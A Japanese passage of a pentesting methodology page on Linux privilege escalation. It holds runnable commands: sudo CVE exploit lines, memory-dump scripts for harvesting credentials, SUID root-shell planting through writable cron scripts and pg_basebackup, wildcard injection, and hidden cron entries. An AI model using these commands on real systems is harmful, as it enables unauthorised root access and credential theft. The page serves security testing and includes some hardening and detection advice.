# Linux 権限昇格

{{#include ../../../banners/hacktricks-training.md}}

より広い背景や過去の列挙ワークフローについては、References に記載されている g0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation、linux-private-i の資料を参照してください。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## システム情報

### OS 情報

まずは、稼働中の OS に関する情報を集めましょう。

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

`PATH` 変数内のいずれかのフォルダに**書き込み権限がある**場合、ライブラリやバイナリを乗っ取れる可能性があります。

```bash
echo $PATH
```

### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーが含まれていませんか？

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

カーネルのバージョンを確認し、権限昇格に利用できるexploitがあるか調べます。

[Kernel/LPE/CVEセクション](../../main-system-information/kernel-lpe-cves/README.md)には、ローカル権限昇格の事例と、Binary ExploitationにあるLinuxカーネルの詳しい解説へのリンクがまとめられています。事例を試す前に、対象のビルドと設定を確認してください。

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

脆弱な kernel の一覧と、すでに**コンパイル済みの exploit**は、こちらで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
**コンパイル済みの exploit**を入手できるほかのサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

このサイトから脆弱な kernel のバージョンをすべて抽出するには、次のようにします:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

カーネル exploit の検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（被害者のマシン上で実行。カーネル 2.x の exploit のみをチェック）

必ず**カーネルのバージョンを Google で検索**してください。カーネルのバージョンがカーネル exploit に記載されている場合があり、その exploit が有効だと確認できます。

カーネル exploitation のその他の手法:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux 権限昇格 - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudoのバージョン

以下に示す脆弱なsudoのバージョンに基づき:

```bash
searchsploit sudo
```

この grep を使って、sudo のバージョンに脆弱性があるか確認できます。

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

upstream の sudo **1.9.14 から 1.9.17** では、sudo がユーザー制御下のディレクトリから `/etc/nsswitch.conf` を読み込む際、非特権のローカルユーザーが `--chroot` オプションを使って root に昇格できます。upstream は **1.9.17p1** でこの問題を修正しました。`sudo -V` が表示するのは `PATH` で選択されたバイナリのみのため、該当するパスにある root-setuid の sudo バイナリをすべて確認してください。ディストリビューションのパッケージでは、upstream のバージョン文字列を変更せずに修正がバックポートされている場合があるため、ベンダーのパッケージ状況も確認してください。[sudo メンテナーの勧告](https://www.openwall.com/lists/oss-security/2025/06/30/3)を参照してください。<sup>[[28]](#references)[[29]](#references)</sup>

この[脆弱性](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)を悪用するための[PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)はこちらです。exploit を実行する前に、使用している `sudo` のバージョンに脆弱性があり、`chroot` 機能に対応していることを確認してください。  

詳細については、元の[脆弱性に関する勧告](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)を参照してください。<sup>[[28]](#references)</sup>

### Sudo のホストベースルールのバイパス (CVE-2025-32462)

upstream の sudo **1.8.8 から 1.9.17** では、ホストベースの sudoers ルールを評価する際、**実際のホスト名**ではなく `sudo -h <host>` で**ユーザーが指定したホスト名**が使われることがあります。upstream は **1.9.17p1** でこの問題を修正しました。ただし、ユーザーは選択したホストに一致する sudoers エントリを持っている必要があります。ローカルポリシーに加えて、ベンダーによるバックポートや別の sudo バイナリも確認してください。[sudo メンテナーの勧告](https://www.openwall.com/lists/oss-security/2025/06/30/2)を参照してください。<sup>[[29]](#references)</sup>

要件:
- 脆弱な sudo バージョン
- ホスト固有の sudoers ルール（ホストが現在のホスト名でも `ALL` でもないこと）

sudoers の設定例:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

許可されたホストを spoofing して悪用する:

```bash
sudo -h devbox id
sudo -h devbox -i
```

選択した名前の名前解決がブロックされる場合は、ホスト上でその名前がどのように解決されるかを確認してください。ログや設定ファイルに名前が記載されているだけでは、その名前が解決可能であることの証明にはなりません。また、`/etc/hosts` の変更には通常、特権付きの書き込みアクセスが必要です。

#### sudo < v1.8.28

この [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) を利用するには、rootを除くすべてのユーザーとしてコマンドを実行できる有効なsudoルールが必要です。例: `(ALL, !root) /bin/bash`。呼び出し元が、認証要件を含め、そのルールを使用する権限を持っている必要もあります。インストール済みパッケージのセキュリティアドバイザリを確認してください。ベンダーは、表示上のupstreamバージョンが1.8.28未満のリリースにも修正をバックポートしています。`!root`ルールがあること、またはバージョンが古いことだけでは、脆弱性があるとは判断できません。パッシブな列挙中に特権コマンドをテストしないでください。

```
sudo -u#-1 /bin/bash
```

### Dmesg の署名検証に失敗

この脆弱性を悪用する方法の**例**については、HTB の **smasher2 box** を確認してください。

```bash
dmesg 2>/dev/null | grep "signature"
```

### さらなるシステム情報収集

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 考えられる防御策を列挙する

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

コンテナ内にいる場合は、まず以下のコンテナセキュリティのセクションを確認し、その後、ランタイム固有の悪用ページに進んでください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ドライブ

**何がどこに、どのような理由でマウントまたはアンマウントされているか**を確認してください。アンマウントされているものがあれば、マウントして個人情報がないか確認できる可能性があります。

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 便利なソフトウェア

便利なバイナリを列挙する

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

また、**何らかのコンパイラがインストールされているか**確認してください。kernel exploitを使用する必要がある場合に役立ちます。使用するマシン（または類似した環境のマシン）でコンパイルすることが推奨されるためです。

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### インストールされている脆弱なソフトウェア

**インストールされているパッケージやサービスのバージョン**を確認しましょう。たとえば、古いバージョンのNagiosがあり、権限昇格に悪用できるかもしれません…\
疑わしいインストール済みソフトウェアについては、バージョンを手動で確認することをおすすめします。

```bash
dpkg -l #Debian
rpm -qa #Centos
```

SSHでマシンにアクセスできる場合は、**openVAS**を使って、マシン内にインストールされている古く脆弱なソフトウェアを確認することもできます。

> [!NOTE] > _これらのコマンドでは大量の情報が表示されますが、そのほとんどは役に立ちません。そのため、OpenVASなど、インストールされているソフトウェアのバージョンに既知のexploitに対する脆弱性がないか確認するアプリケーションの利用をおすすめします。_

## Processes

**どのプロセス**が実行されているかを確認し、必要以上の**権限を持つプロセス**がないか調べてください（たとえば、rootで実行されているtomcatなど）。

```bash
ps aux
ps -ef
top -n 1
```

実行中の[**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md)がないか、必ず確認してください。これを悪用して権限昇格できる可能性があります。**Linpeas**は、プロセスのコマンドライン内にある`--inspect`パラメータを確認して検出します。\
また、**プロセスのバイナリに対する自分の権限も確認してください**。誰かのバイナリを上書きできるかもしれません。

### ユーザーをまたぐ親子プロセスの連鎖

**親プロセスとは異なるユーザー**で実行される子プロセスがあっても、それだけで悪意があるとは限りませんが、有用な**トリアージの手掛かり**になります。一部のユーザー切り替えは想定どおりです（`root`がサービスユーザーのプロセスを起動する、ログインマネージャーがセッションプロセスを作成するなど）。しかし、不自然な連鎖から、ラッパー、デバッグヘルパー、永続化、または脆弱なランタイムの信頼境界が見つかることがあります。

簡単な確認ポイント：

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

驚くような連鎖を見つけたら、親プロセスのコマンドラインと、その動作に影響するすべてのファイル（`config`、`EnvironmentFile`、ヘルパースクリプト、作業ディレクトリ、書き込み可能な引数）を調べてください。実際のprivesc経路では、子プロセス自体は書き込み可能ではなくても、**親が制御するconfig**やヘルパーの連鎖が書き込み可能な場合が何度もありました。

### 削除済みの実行ファイルと、削除済みのまま開かれているファイル

ランタイムの成果物は、削除後もアクセスできることがよくあります。これは、権限昇格にも、機密ファイルをすでに開いているプロセスから証拠を復元する際にも役立ちます。

削除済みの実行ファイルを確認します。

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` が `(deleted)` を指している場合、プロセスはメモリ上にある古いバイナリイメージを引き続き実行しています。これは調査すべき強い兆候です。理由は次のとおりです。

- 削除された実行ファイルに、興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスから、今も有用なファイルディスクリプタにアクセスできる可能性がある
- 特権バイナリが削除されている場合、最近の改ざんや痕跡消去の試みを示している可能性がある

削除済みのまま開かれているファイルをシステム全体から収集します:

```bash
lsof +L1
```

興味深いディスクリプタを見つけたら、直接復元してください：

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

これは、プロセスが削除済みの秘密情報、スクリプト、データベースのエクスポート、または flag ファイルを開いたままの場合に、特に有用です。

### プロセスの監視

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用して、プロセスを監視できます。脆弱なプロセスが頻繁に実行されている場合や、一定の条件が満たされたときに実行される場合に、そのプロセスを特定するうえで非常に役立ちます。

#### sudo 経由の Linux ProcMon

[Linux 用 ProcMon](https://github.com/microsoft/ProcMon-for-Linux) は、選択したプロセスやシステムコールをトレースし、SQLite のトレースとして保存できます。`sudo -l` で制限のない root 権限で実行可能な `procmon` コマンドが許可されている場合、他のユーザーのプロセスの入力や出力を監視できる可能性がないか検討してください。この権限は確認の手がかりにすぎません。トレーサーの対応状況、有効なポリシー、適切なプロセスの活動状況がすべて関係します。トレースファイルには秘密情報が含まれることがあるため、許可されたエクスポートを慎重に調べ、関係のないプロセスを収集しないでください。

### プロセスメモリ

サーバーの一部のサービスは、**認証情報を平文でメモリ内に保存します**。\
通常、他のユーザーに属するプロセスのメモリを読み取るには**root 権限**が必要です。そのため、これは通常、すでに root 権限があり、さらに認証情報を見つけたい場合に役立ちます。\
ただし、**一般ユーザーでも、自分が所有するプロセスのメモリは読み取れる**ことを忘れないでください。

> [!WARNING]
> 最近のほとんどのマシンでは、デフォルトで **ptrace が許可されていません**。そのため、特権のないユーザーが所有する他のプロセスをダンプできない場合があります。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルは、ptrace のアクセス可否を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid を持つすべてのプロセスをデバッグできます。これは従来の ptrace の動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスだけがデバッグできます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability が必要なため、管理者だけが ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace によるトレースは一切できません。一度設定すると、再び ptrace を有効にするには再起動が必要です。

一時的にパスワード vault のロックを解除する同じ UID のプロセスは、別個の認証情報境界となる場合があります。トレースが許可されている場合、実行中でダンプ可能なプロセスから、入力システムコールやメモリを通じて vault のパスワードが露出する可能性があります。暗号化された vault ファイル自体が保護されたままでも同様です。`ptrace_scope=0` は前提条件の一つにすぎません。認証情報の一致、対象のダンプ可能性、他の Linux セキュリティモジュール、プロセスの実行期間も関係します。vault 内のエントリを Unix root ログインに利用できるかどうかは、別途、認証情報の再利用を確認する必要があります。通常の列挙では、入力を取得したり秘密情報を表示したりせず、ポリシーと候補となるプロセスまたは vault のパスを報告してください。[kernel の Yama ドキュメント](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html)と[ptrace のアクセスチェック](https://man7.org/linux/man-pages/man2/ptrace.2.html)を参照してください。

#### GDB

たとえば FTP サービスのメモリにアクセスできる場合、Heap を取得し、その中から認証情報を検索できます。

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDについて、**mapsには、そのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**が示されます。また、**各マッピング領域の権限**も示されます。**mem**疑似ファイルは、**プロセスのメモリそのものを公開します**。**maps**ファイルから、**読み取り可能なメモリ領域**とそのオフセットがわかります。この情報を使って、**memファイル内の位置を移動し、読み取り可能な領域をすべてファイルにdump**します。

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供します。仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` の読み取りが許可されているのは **root** と **kmem** グループのみです。

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux 向け ProcDump

ProcDump は、Windows 用 Sysinternals ツールスイートに含まれる従来の ProcDump ツールを Linux 向けに再構築したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### ツール

プロセスメモリをダンプするには、次のツールを使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 要件を手動で削除し、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (root が必要)

### プロセスメモリからの認証情報

#### 手動での例

authenticator プロセスが実行中だと分かった場合:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

プロセスをdumpし（プロセスのメモリをdumpするさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます：

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) ツールは、**メモリ内の平文認証情報**と、一部の**よく知られたファイル**から認証情報を**盗み取ります**。正常に動作させるには root 権限が必要です。

| 機能                                              | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDM のパスワード（Kali Desktop、Debian Desktop）   | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                         | lightdm              |
| VSFTPd（アクティブな FTP 接続）                   | vsftpd               |
| Apache2（アクティブな HTTP Basic Auth セッション） | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用） | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## スケジュール/Cronジョブ

### rootとして実行されるCrontab UI (alseambusher) – Webベースのスケジューラを利用したprivesc

Web上の「Crontab UI」パネル (alseambusher/crontab-ui) がrootとして実行され、loopbackにのみバインドされている場合でも、SSHのローカルポートフォワーディング経由でアクセスし、特権ジョブを作成して権限昇格できます。<sup>[[1]](#references)[[4]](#references)</sup>

一般的な手順
- loopback専用ポート（例: 127.0.0.1:8000）とBasic-Auth realmを`ss -ntlp` / `curl -v localhost:8000`で特定する
- 運用関連のファイルから認証情報を探す:
  - `zip -P <password>`を含むバックアップ/スクリプト
  - `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."`を公開するsystemd unit
- トンネルを作成してログインする:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限ジョブを作成してすぐに実行する（SUID shellを配置）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Crontab UI を root として実行しない。専用ユーザーを使い、権限を最小限に制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する。パスワードを使い回さない
- unit files に秘密情報を埋め込まない。secret stores または root のみが読み取り可能な EnvironmentFile を使う
- オンデマンドのジョブ実行に対する audit/logging を有効にする

スケジュールされたジョブに脆弱性がないか確認してください。root が実行するスクリプトを悪用できるかもしれません（wildcard vuln？root が使うファイルを変更できる？symlink を使う？root が使うディレクトリに特定のファイルを作成する？）。

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` が使用されている場合、実際に実行される名前を確認します:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

これは false positive を防ぎます。書き込み可能な定期実行ディレクトリが役立つのは、payload のファイル名がローカルの `run-parts` のルールに一致する場合だけです。

### Cron path

たとえば、_/etc/crontab_ 内で PATH を確認できます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザー「user」が /home/user に対する書き込み権限を持っていることに注目してください）

この crontab 内で root ユーザーが、パスを設定せずにコマンドやスクリプトを実行しようとした場合を考えてみましょう。たとえば、_\* \* \* \* root overwrite.sh_ のような場合です。\
その場合、次の方法で root shell を取得できます。

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### ワイルドカードを含むスクリプトを使ったCron（Wildcard Injection）

rootが実行するスクリプトのコマンドに「**\***」が含まれている場合、これを悪用して予期しない動作（privescなど）を引き起こせる可能性があります。例：

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**wildcard の前に** _**/some/path/\***_ **のようなパスが付いている場合、脆弱ではありません（** _**./\***_ **の場合も同様です）。**

wildcard を悪用するその他の手法については、次のページを参照してください。


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron のログパーサーにおける Bash 算術展開インジェクション

Bash の算術式では、信頼できないテキストが式として解釈されることがあります。影響を受ける Bash のコンテキストでは、その式内の配列インデックスによってコマンド置換が評価される場合があります。特権で動作する cron／パーサーが、攻撃者が制御できるログテキストを算術比較に渡すと、その置換がパーサーの実行ユーザー権限で実行される可能性があります。<sup>[[22]](#references)</sup> これは Bash の式とバージョンに正確に依存します。展開された変数内に単独で `$(...)0` という文字列があっても、それだけで再評価を確実に示せるわけではありません。

入力は、ファイルメタデータや、ユーザーが書き込み可能な場所から読み取られる別のフィールドに由来することもあります。たとえば、特権で動作するクリーンアップスクリプトが画像の `Producer` タグを読み取り、`[[ "$producer" -eq "expected" ]]` と比較する場合、変数がクォートされていても算術比較が行われます。実行されるユーザー、タグの取得元となるファイル、比較前の変換処理、そして正確な Bash の挙動を確認してください。テキストラベルには文字列比較を使い、数値には算術処理の前に入力が10進数字のみであることを検証してください。[Bash の算術規則](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html)を参照してください。

- 典型的な脆弱パターン：
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism の安全なローカル動作プローブ（特権プロセスやファイル変更なし）：
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

実際にスケジュールされている script と、それが開くリテラルな入力パスを追跡してください。ログファイル自体に書き込めなくても、sticky bit のない親ディレクトリに書き込み・実行権限があれば、そのディレクトリエントリを置き換えられる場合があります。権限の違いを見分けるには `namei -l` が役立ちます。別の書き込み可能なログパス、読み取り不能な scheduler、またはそのフィールドを Bash の算術式として評価しない parser では、この経路が成立することの証明にはなりません。

### Cron script の上書きと symlink

root で実行される cron script を**変更できる**なら、簡単に shell を取得できます：

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

root が実行するスクリプトが**あなたに完全なアクセス権があるディレクトリ**を使っている場合、そのディレクトリを削除し、あなたが制御するスクリプトを置いた別のディレクトリへのシンボリックリンクを作成すると有効な場合があります。

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### シンボリックリンクの検証とより安全なファイル処理

パスを指定してファイルを読み書きする特権付きスクリプトやバイナリを確認する際は、リンクがどのように処理されるかを検証してください。

- `stat()` はシンボリックリンクをたどり、リンク先のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` は、最終的なリンク先の解決や、各パス構成要素のパーミッション確認に役立ちます。

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

防御側や開発者がシンボリックリンクを悪用する手口への対策として、より安全なパターンには次のものがあります。

- `O_EXCL` と `O_CREAT`：パスがすでに存在する場合は失敗する（攻撃者が事前に作成したリンクやファイルを防ぐ）。
- `openat()`：信頼できるディレクトリのファイルディスクリプターを基準に操作する。
- `mkstemp()`：安全なパーミッションで一時ファイルをアトミックに作成する。

### 書き込み可能なペイロードを持つカスタム署名付きcronバイナリ
rootのcron jobが実行するバイナリそのものに書き込める一般ユーザーは、権限境界を越えられる可能性があります。ただし、カスタム署名チェックによって、署名のない置き換えを拒否できる場合があります。記録されている事例では、root所有のELFのモードは `0760` で、root所有者が実行できる一方、そのグループのメンバーも書き込める状態でした。確認できたプロセストレースでは、jobがバイナリを実行する前に `objcopy` が `.text_sig` を抽出していました。検証スクリプト全体は読み取れませんでした。<sup>[[2]](#references)</sup>

成功した置き換えには、leakした秘密の署名素材を使ってELF signerで署名が付けられていました。その[フォーマットのドキュメント](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)には、実行ファイルの `.text` から生成される署名セクションについて説明されています。証明書や、一致する文字列を `.text_sig` に追加するだけで、確認できない検証処理を満たせるとは示されていません。書き込み可能な署名付きバイナリが悪用可能だと結論づける前に、実際のスケジュール対象パス、有効な書き込み権限、rootによる実行、検証ポリシーを確認してください。.text_sig` セクションだけでは、あくまで調査の手がかりにすぎません。

### よく実行されるcron job

1分、2分、または5分ごとに実行されるプロセスを探すために、プロセスを監視できます。そこに付け込んで権限昇格できるかもしれません。

たとえば、**1分間、0.1秒ごとに監視**し、**実行回数が少ないコマンドから並べ替え**て、最も多く実行されたコマンドを削除するには、次のようにします。

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**次のものも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（起動するすべてのプロセスを監視して一覧表示します）。

### 攻撃者が設定した mode bits を保持する root backup（pg_basebackup）

root 権限で動く cron が、自分が書き込み可能なデータベースディレクトリに対して `pg_basebackup`（または再帰的なコピー）を実行している場合、**SUID/SGID binary** を仕込むことで、同じ mode bits を保持したまま **root:root** 所有で backup 出力先にコピーさせることができます。<sup>[[26]](#references)</sup>

一般的な調査手順（低権限の DB user として）:
- `pspy` を使い、root cron が毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを実行していることを確認します。
- ソースクラスター（例: `/var/lib/postgresql/14/main`）が自分の書き込み可能であり、ジョブ実行後に宛先（`/opt/backups/current`）が root 所有になることを確認します。

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

これは、`pg_basebackup` がクラスタのコピー時にファイルモードビットを保持するためです。root で実行すると、コピー先のファイルは **root 所有権 + 攻撃者が指定した SUID/SGID** を引き継ぎます。権限を保持したまま実行可能な場所に書き込む、同様の特権バックアップ／コピー処理は脆弱です。

### 見えない cron ジョブ

コメントの後ろにキャリッジリターン（改行文字なし）を置くことで、cronjob を作成できます。この cron ジョブは正常に動作します。例（キャリッジリターン文字に注意）：

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

この種の隠されたエントリを検出するには、制御文字を表示できるツールを使って cron ファイルを調べます:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## サービス

### 書き込み可能な _.service_ ファイル

